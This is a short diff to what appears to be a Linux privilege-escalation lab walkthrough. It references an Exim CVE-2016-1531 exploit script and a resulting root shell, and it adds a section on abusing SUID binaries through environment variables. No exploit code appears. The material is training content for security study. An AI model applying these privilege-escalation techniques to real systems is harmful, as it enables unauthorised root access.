@@ -707,7 +707,7 @@ user@debian:~$
 user@debian:~$ 
 
 ```
-
+### 
 ```
 /home/user/tools/suid/exim/cve-2016-1531.sh
 
@@ -727,5 +727,16 @@ sh-4.1#
 
 ```
 
+### SUID / SGID Executables - Environment Variables
 
+```
+user@debian:/usr/local/bin$ ls
+compress.sh  overwrite.sh  suid-env  suid-env2  suid-so
+user@debian:/usr/local/bin$ suid-env
+[....] Starting web server: apache2httpd (pid 1715) already running
+. ok 
+user@debian:/usr/local/bin$ 
+
+
+```
 
